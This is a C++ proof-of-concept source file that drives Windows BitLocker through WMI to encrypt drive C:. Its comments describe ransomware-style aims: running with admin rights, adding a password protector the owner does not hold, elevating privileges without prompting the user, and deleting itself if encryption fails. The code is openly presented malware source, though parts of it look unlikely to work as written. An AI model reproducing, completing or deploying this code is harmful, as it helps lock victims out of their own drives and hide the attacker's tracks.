/*
 This code is a PoC but has serious limitations

 To work, the application must run with admin privs, does not handle recovery keys
 or passwords. 
 Will need additional methods to configure these aspects I am looking at using Win32_EncryptVolume methods
 such as :
    ProtectKeyWithNumericalPassword 
    ProtectKeyWithTPM (probably not though)
    
The other limitation is that this code requires bitlocker to be enabled and configured.
Im looking into a Python that can check if this is the case and delete itself if not enabled, 
or attempt to enable it and continue.
:).

*/
#include <iostream>
#include <windows.h>
#include <wbemidl.h>
#include <cstdio> // to remove application if it fails
#pragma comment(lib, "wbemuuid.lib")

void EncryptDrive(const std::wstring& driveLetter) {
    HRESULT hres;

    // Initialize COM library for use
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    // Check if COM library initialization failed.
    if (FAILED(hres)) {
        std::wcerr << L"Failed to initialize COM library. Error code: " << hres << std::endl;
        return;
    }

    // Initialize security for process.
    hres = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL);
    // Throw error if security init fails.
    if (FAILED(hres)) {
        std::wcerr << L"Failed to initialize security. Error code: " << hres << std::endl;
        CoUninitialize();
        return;
    }

    // Obtain the initial locator to WMI.
    IWbemLocator* pLoc = NULL;
    // Create instance of WMI locator, store result in hres.
    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0, // Not used, must be NULL
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        (LPVOID*)&pLoc);

    if (FAILED(hres)) {
        std::wcerr << L"Failed to create IWbemLocator object. Error code: " << hres << std::endl;
        CoUninitialize();
        return;
    }

    // Connect to WMI through the IWbemLocator::ConnectServer method.
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(
        L"ROOT\\CIMV2\\Security\\MicrosoftVolumeEncryption", // WMI namespace
        NULL,    // User name
        NULL,    // User password
        0,       // Locale
        NULL,    // Security flags
        0,       // Authority
        0,       // Context object
        &pSvc);  // IWbemServices proxy

    if (FAILED(hres)) {
        std::wcerr << L"Could not connect to WMI. Error code: " << hres << std::endl;
        pLoc->Release();
        CoUninitialize();
        return;
    }

    // Set the proxy so that impersonation of the client occurs.
    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
        NULL,                        // Server principal name
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // Client identity
        EOAC_NONE);                  // Proxy capabilities

    if (FAILED(hres)) {
        std::wcerr << L"Could not set proxy blanket. Error code: " << hres << std::endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return;
    } // essentially, this will allow the server to impersonate the client and take on the security context of the client.
    // If the client is administrator, the server will also be able to perform administrative tasks.
    // Therefore, the next step is to check if the user is an administrator, and if not, attempt to elevate, WITHOUT prompting the user.
    // Get the EncryptableVolume object for the specified drive.
    std::wstring query = L"SELECT * FROM Win32_EncryptableVolume WHERE DriveLetter = '" + driveLetter + L":\\'";
    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->ExecQuery(
        L"WQL",
        const_cast<wchar_t*>(query.c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator);

    if (FAILED(hres)) {
        std::wcerr << L"Query for EncryptableVolume failed. Error code: " << hres << std::endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return;
    }

    IWbemClassObject* pObj = NULL;
    ULONG uReturn = 0;
    while (pEnumerator) {
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pObj, &uReturn);
        if (uReturn == 0) {
            break;
        }

        // Call the Encrypt method.
        VARIANT vtPath;
        hres = pObj->Get(L"__PATH", 0, &vtPath, NULL, NULL);
        if (SUCCEEDED(hres)) {
            IWbemClassObject* pOutParams = NULL;
            hres = pSvc->ExecMethod(
                vtPath.bstrVal,
                L"Encrypt",
                0,
                NULL,
                NULL,
                &pOutParams,
                NULL);

            if (SUCCEEDED(hres)) {
                std::wcout << L"Encryption started successfully on " << driveLetter << L":\\" << std::endl;
            } else {
                std::wcerr << L"Failed to start encryption. Error code: " << hres << std::endl;
            }

            if (pOutParams) {
                pOutParams->Release();
            }
            VariantClear(&vtPath);
        }
        pObj->Release();
    }

    // Cleanup
    pEnumerator->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
}
// check if bitlocker is enabled
bool IsBitlockerEnabled(const std::wstring& driveLetter) {
    HRESULT hres;
    bool isEnabled = false;

    // Initialize COM.
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        std::wcerr << L"Failed to initialize COM library. Error code: " << hres << std::endl;
        return isEnabled;
    }

    // Initialize security.
    hres = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL);

    if (FAILED(hres)) {
        std::wcerr << L"Failed to initialize security. Error code: " << hres << std::endl;
        CoUninitialize();
        return isEnabled;
    }

    // Obtain the initial locator to WMI.
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        (LPVOID*)&pLoc);

    if (FAILED(hres)) {
        std::wcerr << L"Failed to create IWbemLocator object. Error code: " << hres << std::endl;
        CoUninitialize();
        return isEnabled;
    }

    // Connect to WMI through the IWbemLocator::ConnectServer method.
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(
        L"ROOT\\CIMV2\\Security\\MicrosoftVolumeEncryption", // WMI namespace
        NULL,    // User name
        NULL,    // User password
        0,       // Locale
        NULL,    // Security flags
        0,       // Authority
        0,       // Context object
        &pSvc);  // IWbemServices proxy

    if (FAILED(hres)) {
        std::wcerr << L"Could not connect to WMI. Error code: " << hres << std::endl;
        pLoc->Release();
        CoUninitialize();
        return isEnabled;
    }

    // Set the proxy so that impersonation of the client occurs.
    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
        NULL,                        // Server principal name
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // Client identity
        EOAC_NONE);                  // Proxy capabilities

    if (FAILED(hres)) {
        std::wcerr << L"Could not set proxy blanket. Error code: " << hres << std::endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return isEnabled;
    }

    // Modified query to check BitLocker status
    std::wstring query = L"SELECT * FROM Win32_EncryptableVolume WHERE DriveLetter = '" + driveLetter + L":\\'";
    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->ExecQuery(
        L"WQL",
        const_cast<wchar_t*>(query.c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator);

    if (SUCCEEDED(hres)) {
        IWbemClassObject* pObj = NULL;
        ULONG uReturn = 0;
        
        if (pEnumerator->Next(WBEM_INFINITE, 1, &pObj, &uReturn) == WBEM_S_NO_ERROR) {
            VARIANT vtProtectionStatus;
            hres = pObj->Get(L"ProtectionStatus", 0, &vtProtectionStatus, NULL, NULL);
            
            if (SUCCEEDED(hres)) {
                // 0 = Unprotected, 1 = Protected
                isEnabled = (vtProtectionStatus.intVal == 1);
                VariantClear(&vtProtectionStatus);
            }
            pObj->Release();
        }
    }

    // Cleanup
    pEnumerator->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    return isEnabled;
}
// enable bitlocker
bool EnableBitlocker(const std::wstring& driveLetter) {
    EncryptDrive(driveLetter);
    Sleep(5000);  // 5 seconds
    return IsBitlockerEnabled(driveLetter);
}
// main function
int main() {
    std::wstring drive = L"C";
    
    if (!IsBitlockerEnabled(drive)) {
        std::wcout << L"BitLocker is not enabled. Attempting to enable it..." << std::endl;
        
        if (!EnableBitlocker(drive)) {
            std::wcout << L"Failed to enable BitLocker. Deleting application..." << std::endl;
            // Get the path of the current executable
            char path[MAX_PATH];
            GetModuleFileNameA(NULL, path, MAX_PATH);
            // Delete the executable
            remove(path);
            return 1;
        }
    }
    
    std::wcout << L"BitLocker is enabled. Proceeding with operation..." << std::endl;
    EncryptDrive(drive);
    return 0;
}
